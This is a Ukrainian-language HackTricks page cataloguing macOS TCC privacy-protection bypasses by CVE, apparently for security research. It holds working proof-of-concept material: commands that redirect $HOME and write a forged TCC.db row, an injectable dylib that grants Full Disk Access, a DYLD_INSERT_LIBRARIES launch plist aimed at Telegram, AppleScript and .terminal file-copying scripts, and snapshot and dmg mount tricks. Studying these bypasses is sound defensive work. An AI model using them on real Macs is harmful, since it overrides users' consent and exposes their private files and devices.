# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Обхід запису

Це не обхід, це просто те, як працює TCC: **Він не захищає від запису**. Якщо Terminal **не має доступу для читання Робочого столу користувача, він все ще може записувати в нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Розширена атрибутика `com.apple.macl`** додається до нового **файлу**, щоб надати доступ **додатку творця** для його читання.

### TCC ClickJacking

Можливо **помістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши. Ви можете знайти PoC у [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Запит TCC за довільною назвою

Зловмисник може **створити додатки з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змусити його запитувати доступ до деякого захищеного місця TCC. Користувач подумає, що легітимний додаток є тим, хто запитує цей доступ.\
Більше того, можливо **видалити легітимний додаток з Dock і помістити на нього підроблений**, так що коли користувач натискає на підроблений (який може використовувати той же значок), він може викликати легітимний, запитати дозволи TCC і виконати шкідливе ПЗ, змушуючи користувача вірити, що легітимний додаток запитав доступ.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC у:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH мав "Повний доступ до диска"**. Щоб вимкнути це, вам потрібно, щоб він був у списку, але вимкнений (видалення його зі списку не зніме ці привілеї):

![](<../../../../../images/image (1077).png>)

Тут ви можете знайти приклади того, як деякі **шкідливі програми змогли обійти цю захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Зверніть увагу, що тепер, щоб мати можливість увімкнути SSH, вам потрібен **Повний доступ до диска**

### Обробка розширень - CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб надати **певному додатку дозволи на його читання.** Цей атрибут встановлюється, коли **перетягують** файл на додаток або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **додатку за замовчуванням**.

Отже, користувач може **зареєструвати шкідливий додаток** для обробки всіх розширень і викликати Launch Services, щоб **відкрити** будь-який файл (так що шкідливий файл отримає доступ для його читання).

### iCloud

Право **`com.apple.private.icloud-account-access`** дозволяє спілкуватися з **`com.apple.iCloudHelper`** XPC сервісом, який **надасть токени iCloud**.

**iMovie** та **Garageband** мали це право та інші, які дозволяли.

Для отримання більшої **інформації** про експлойт для **отримання токенів iCloud** з цього права перегляньте доповідь: [**#OBTS v5.0: "Що відбувається на вашому Mac, залишається в iCloud Apple?!" - Войцех Регула**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Автоматизація

Додаток з дозволом **`kTCCServiceAppleEvents`** зможе **контролювати інші додатки**. Це означає, що він може **зловживати дозволами, наданими іншим додаткам**.

Для отримання додаткової інформації про Apple Scripts перегляньте:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо додаток має **дозвіл на автоматизацію над `iTerm`**, наприклад, у цьому прикладі **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Над iTerm

Terminal, який не має FDA, може викликати iTerm, який має його, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Over Finder

Або якщо додаток має доступ до Finder, це може бути скрипт, подібний до цього:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою програми

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Користувацький **tccd демон** використовує **`HOME`** **env** змінну для доступу до бази даних користувачів TCC з: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цією публікацією на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) і оскільки демон TCC працює через `launchd` в домені поточного користувача, можливо **контролювати всі змінні середовища**, які передаються йому.\
Таким чином, **зловмисник може встановити змінну середовища `$HOME`** в **`launchctl`**, щоб вказати на **контрольовану** **каталогію**, **перезапустити** **демон TCC** і потім **безпосередньо змінити базу даних TCC**, щоб надати собі **всі доступні права TCC** без запиту у кінцевого користувача.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Примітки

Примітки мали доступ до захищених TCC місць, але коли створюється примітка, вона **створюється в незахищеному місці**. Тож ви могли б попросити примітки скопіювати захищений файл у примітку (тобто в незахищене місце), а потім отримати доступ до файлу:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Трансокація

Бінарний файл `/usr/libexec/lsd` з бібліотекою `libsecurity_translocate` мав право `com.apple.private.nullfs_allow`, що дозволяло йому створювати **nullfs** монтування, і мав право `com.apple.private.tcc.allow` з **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Було можливим додати атрибут карантину до "Library", викликати **`com.apple.security.translocation`** XPC сервіс, а потім він відображав Library на **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library могли бути **доступні**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** має цікаву функцію: Коли він працює, він **імпортує** файли, скинуті в **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** у "медіатеку" користувача. Більше того, він викликає щось на зразок: **`rename(a, b);`**, де `a` і `b` є:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Ця **`rename(a, b);`** поведінка вразлива до **умови гонки**, оскільки можливо помістити всередину папки `Automatically Add to Music.localized` підроблений **TCC.db** файл, а потім, коли нова папка (b) створюється для копіювання файлу, видалити його і вказати на **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Якщо **`SQLITE_SQLLOG_DIR="path/folder"`**, це в основному означає, що **будь-яка відкрита база даних копіюється в цей шлях**. У цьому CVE цей контроль був зловжито для **запису** всередину **SQLite бази даних**, яка буде **відкрита процесом з FDA базою даних TCC**, а потім зловживати **`SQLITE_SQLLOG_DIR`** з **символічним посиланням у назві файлу**, так що коли ця база даних **відкрита**, користувач **TCC.db перезаписується** з відкритою.\
**Більше інформації** [**в описі**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **і**[ **в доповіді**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Якщо змінна середовища **`SQLITE_AUTO_TRACE`** встановлена, бібліотека **`libsqlite3.dylib`** почне **логувати** всі SQL запити. Багато додатків використовували цю бібліотеку, тому було можливим логувати всі їхні SQLite запити.

Кілька додатків Apple використовували цю бібліотеку для доступу до захищеної інформації TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ця **змінна середовища використовується фреймворком `Metal`**, який є залежністю для різних програм, зокрема `Music`, яка має FDA.

Встановлюючи наступне: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Якщо `path` є дійсним каталогом, помилка спрацює, і ми можемо використовувати `fs_usage`, щоб побачити, що відбувається в програмі:

- файл буде `open()`ed, з назвою `path/.dat.nosyncXXXX.XXXXXX` (X - випадковий)
- один або кілька `write()` запишуть вміст у файл (ми не контролюємо це)
- `path/.dat.nosyncXXXX.XXXXXX` буде `renamed()`d на `path/name`

Це тимчасове записування файлу, за яким слідує **`rename(old, new)`**, **яке не є безпечним.**

Це не безпечно, оскільки потрібно **окремо вирішити старі та нові шляхи**, що може зайняти деякий час і бути вразливим до Race Condition. Для отримання додаткової інформації ви можете ознайомитися з функцією `xnu` `renameat_internal()`.

> [!CAUTION]
> Отже, в основному, якщо привілейований процес перейменовує з папки, якою ви керуєте, ви можете отримати RCE і змусити його отримати доступ до іншого файлу або, як у цьому CVE, відкрити файл, який створила привілейована програма, і зберегти FD.
>
> Якщо перейменування отримує доступ до папки, якою ви керуєте, поки ви змінили вихідний файл або маєте до нього FD, ви змінюєте файл (або папку) призначення, щоб вказати на символічне посилання, тому ви можете записувати, коли захочете.

Це була атака в CVE: Наприклад, щоб перезаписати `TCC.db` користувача, ми можемо:

- створити `/Users/hacker/ourlink`, щоб вказати на `/Users/hacker/Library/Application Support/com.apple.TCC/`
- створити каталог `/Users/hacker/tmp/`
- встановити `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- спровокувати помилку, запустивши `Music` з цією змінною середовища
- зловити `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X - випадковий)
- тут ми також `open()` цей файл для запису і тримаємо дескриптор файлу
- атомарно переключити `/Users/hacker/tmp` з `/Users/hacker/ourlink` **в циклі**
- ми робимо це, щоб максимізувати наші шанси на успіх, оскільки вікно гонки досить вузьке, але програш гонки має незначні недоліки
- почекати трохи
- перевірити, чи пощастило
- якщо ні, запустити знову з самого початку

Більше інформації на [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Тепер, якщо ви спробуєте використовувати змінну середовища `MTL_DUMP_PIPELINES_TO_JSON_FILE`, програми не запустяться

### Apple Remote Desktop

Як root ви можете увімкнути цю службу, і **агент ARD матиме повний доступ до диска**, що може бути зловжито користувачем для копіювання нової **бази даних користувача TCC**.

## За **NFSHomeDirectory**

TCC використовує базу даних у домашній папці користувача для контролю доступу до ресурсів, специфічних для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувач зможе перезапустити TCC з змінною середовища $HOME, що вказує на **іншу папку**, користувач може створити нову базу даних TCC у **/Library/Application Support/com.apple.TCC/TCC.db** і обманути TCC, щоб надати будь-який дозвіл TCC будь-якому додатку.

> [!TIP]
> Зверніть увагу, що Apple використовує налаштування, збережені в профілі користувача в атрибуті **`NFSHomeDirectory`** для **значення `$HOME`**, тому якщо ви скомпрометуєте додаток з дозволами на зміну цього значення (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **озброїти** цю опцію за допомогою обходу TCC.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), щоб змінити **HOME** папку користувача.

1. Отримати _csreq_ blob для цільового додатку.
2. Посадити підроблений _TCC.db_ файл з необхідним доступом і _csreq_ blob.
3. Експортувати запис служби каталогів користувача за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змінити запис служби каталогів, щоб змінити домашню папку користувача.
5. Імпортувати змінений запис служби каталогів за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупинити _tccd_ користувача і перезавантажити процес.

Другий POC використовував **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Було можливим запустити **`configd`** з параметром **`-t`**, зловмисник міг вказати **кастомний пакет для завантаження**. Отже, експлуатація **замінює** методи **`dsexport`** і **`dsimport`** зміни домашньої папки користувача на **впровадження коду в `configd`**.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## За допомогою впровадження процесу

Існують різні техніки для впровадження коду в процес і зловживання його привілеями TCC:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Більше того, найпоширеніше впровадження процесу для обходу TCC виявлено через **плагіни (завантажити бібліотеку)**.\
Плагіни - це додатковий код, зазвичай у формі бібліотек або plist, які будуть **завантажені основним додатком** і виконуватимуться в його контексті. Отже, якщо основний додаток мав доступ до файлів, обмежених TCC (через надані дозволи або права), **кастомний код також матиме його**.

### CVE-2020-27937 - Directory Utility

Додаток `/System/Library/CoreServices/Applications/Directory Utility.app` мав право **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував плагіни з розширенням **`.daplug`** і **не мав посиленого** часу виконання.

Щоб озброїти цей CVE, **`NFSHomeDirectory`** **змінюється** (зловживаючи попереднім правом) для того, щоб мати можливість **взяти під контроль базу даних TCC користувачів** для обходу TCC.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Бінарний файл **`/usr/sbin/coreaudiod`** мав права `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перший **дозволяє впровадження коду**, а другий надає доступ до **управління TCC**.

Цей бінарний файл дозволяв завантажувати **плагіни сторонніх виробників** з папки `/Library/Audio/Plug-Ins/HAL`. Отже, було можливим **завантажити плагін і зловживати дозволами TCC** з цим PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Плагіни абстракції пристроїв (DAL)

Системні програми, які відкривають потік камери через Core Media I/O (додатки з **`kTCCServiceCamera`**), завантажують **в процесі ці плагіни**, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежено SIP).

Просто зберігання в цій папці бібліотеки з загальним **конструктором** дозволить **впровадити код**.

Кілька додатків Apple були вразливими до цього.

### Firefox

Додаток Firefox мав права `com.apple.security.cs.disable-library-validation` та `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Для отримання додаткової інформації про те, як легко експлуатувати це [**перевірте оригінальний звіт**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав права **`com.apple.private.tcc.allow`** та **`com.apple.security.get-task-allow`**, що дозволяло інжектувати код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав права **`com.apple.security.cs.allow-dyld-environment-variables`** та **`com.apple.security.cs.disable-library-validation`**, тому було можливим зловживання цим для **отримання доступу до його дозволів**, таких як запис з камери. Ви можете [**знайти payload у звіті**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Зверніть увагу, як використовувати змінну середовища для завантаження бібліотеки, **було створено кастомний plist** для інжекції цієї бібліотеки, і **`launchctl`** було використано для її запуску:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Через відкриті виклики

Можливо викликати **`open`** навіть під час пісочниці

### Скрипти терміналу

Досить поширено надавати терміналу **Повний доступ до диска (FDA)**, принаймні на комп'ютерах, які використовують технічні спеціалісти. І можливо викликати **`.terminal`** скрипти, використовуючи його.

**`.terminal`** скрипти - це plist файли, такі як цей, з командою для виконання в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок може записати термінальний скрипт у такому місці, як /tmp, і запустити його з командою, такою як:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## За допомогою монтування

### CVE-2020-9771 - обхід TCC mount_apfs та ескалація привілеїв

**Будь-який користувач** (навіть без привілеїв) може створити та змонтувати знімок Time Machine та **отримати доступ до ВСІХ файлів** цього знімка.\
Єдине привілейоване, яке потрібно, це щоб застосунок (наприклад, `Terminal`) мав **Повний доступ до диска** (FDA) (`kTCCServiceSystemPolicyAllfiles`), що має бути надано адміністратором.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Монтування через файл TCC

Навіть якщо файл бази даних TCC захищений, було можливим **монтувати новий файл TCC.db** через директорію:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перевірте **повний експлойт** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Як пояснюється в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), цей CVE зловживав `diskarbitrationd`.

Функція `DADiskMountWithArgumentsCommon` з публічного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак, її можна обійти, безпосередньо викликавши `diskarbitrationd` і, отже, використовуючи елементи `../` у шляху та символічні посилання.

Це дозволило зловмиснику виконувати довільні монтування в будь-якому місці, включаючи базу даних TCC через право `com.apple.private.security.storage-exempt.heritable` `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захисти TCC.

### Служби геолокації

Існує третя база даних TCC у **`/var/db/locationd/clients.plist`**, щоб вказати клієнтів, яким дозволено **доступ до служб геолокації**.\
Папка **`/var/db/locationd/` не була захищена від монтування DMG**, тому було можливим змонтувати наш власний plist.

## За допомогою автозапуску

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## За допомогою grep

В кількох випадках файли зберігатимуть чутливу інформацію, таку як електронні листи, номери телефонів, повідомлення... у незахищених місцях (що вважається вразливістю в Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Синтетичні кліки

Це більше не працює, але [**працювало в минулому**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Інший спосіб, використовуючи [**CoreGraphics події**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Посилання

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ способів обійти механізми конфіденційності macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ НОВИХ способів обійти механізми конфіденційності MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
